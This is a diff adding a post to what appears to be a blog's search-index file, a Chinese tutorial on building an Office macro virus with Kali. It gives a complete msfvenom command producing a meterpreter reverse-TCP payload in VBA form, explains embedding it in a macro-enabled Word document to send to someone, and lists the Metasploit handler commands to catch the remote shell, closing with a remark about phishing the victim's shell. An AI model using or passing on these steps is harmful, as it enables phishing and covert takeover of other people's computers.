@@ -542,6 +542,45 @@ SHOW DATABASES;<span aria-hidden="true" class="line-numbers-rows"><span></span><
       </tags>
   </entry>
   <entry>
+    <title>kali教程之office宏病毒</title>
+    <url>/2023/07/14/kali%E6%95%99%E7%A8%8B%E4%B9%8Boffice%E5%AE%8F%E7%97%85%E6%AF%92/</url>
+    <content><![CDATA[<p>kali好久之前就已经安装好了, 当时不知道具体用法. 今天偶然发现kali如此有趣, 于是开一个kali系列的教程.</p>
+<p>VBA是基于Visual Basic发展而来的，与Visual Basic具有相似的语言结构。使用VBA可以完成很多事情，基于Excel、Word的VBA小程序不计其数。宏病毒在Word中引入宏之后出现的。目前Office 是较为流行的编辑软件，并且跨越了多种操作系统，宏病毒利用这一点得到了大范围的传播。</p>
+<p>构造一个包含宏病毒的Word文件也并不复杂，只要编写一个Auto_Open函数，就可自动引发病毒。 在Word打开这个文件时， 宏病毒会执行， 然后感染其他文件或直接删除其他文件等。Word宏和其他样式存储在模版DOT文件中， 因此总是把Word文件转成模版，再将其存储为宏。</p>
+<p>好的, 现在开始教程!</p>
+<p>打开kali, 在终端中键入<code>msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.51 LPORT=4444 -f vba-exe</code></p>
+<p>各参数意义如下:</p>
+<ul>
+<li>–platform windows - 指定目标平台是Windows</li>
+<li>-p windows&#x2F;meterpreter&#x2F;reverse_tcp - 指定使用的payload是meterpreter reverse TCP</li>
+<li>LHOST&#x3D;192.168.68.125 - 指定本地监听的IP地址</li>
+<li>LPORT&#x3D;4444 - 指定本地监听的端口号</li>
+<li>-e x86&#x2F;shikata_ga_nai - 使用shikata_ga_nai编码器对payload进行编码</li>
+<li>-f vba-exe - 将payload输出为VBA格式的可执行文件</li>
+</ul>
+<p>只有操作系统和架构不同的时候需要改一下命令, 对于windows电脑的64位系统, 上面的命令可以直接使用, 键入命令并确认后可以看到如下:</p>
+<img data-src="/2023/07/14/kali教程之office宏病毒/1.png" style="zoom:70%;">
+
+<p>我们可以看到由两部分: <code>macro code</code>, 和<code>data</code>.</p>
+<p>我们可以将<code>macro</code>制作成宏代码, <code>data</code>需要插入在word文档最后. 你需要保存为启用宏的文档, 后缀为docm</p>
+<p>到现在就只做好word文档病毒了. 将文档发给别人, 然后进行如下操作:</p>
+<p>在Kali中启动metasploit, 依次键入</p>
+<pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use exploit&#x2F;multi&#x2F;handler 
+msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
+msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.3.51
+msf6 exploit(multi&#x2F;handler) &gt; set lport 4444
+msf6 exploit(multi&#x2F;handler) &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后就可以美美钓鱼劫持对方shell啦</p>
+]]></content>
+      <categories>
+        <category>计算机病毒</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>next主题源文件说明</title>
     <url>/2023/01/24/next%E4%B8%BB%E9%A2%98%E6%BA%90%E6%96%87%E4%BB%B6%E8%AF%B4%E6%98%8E/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
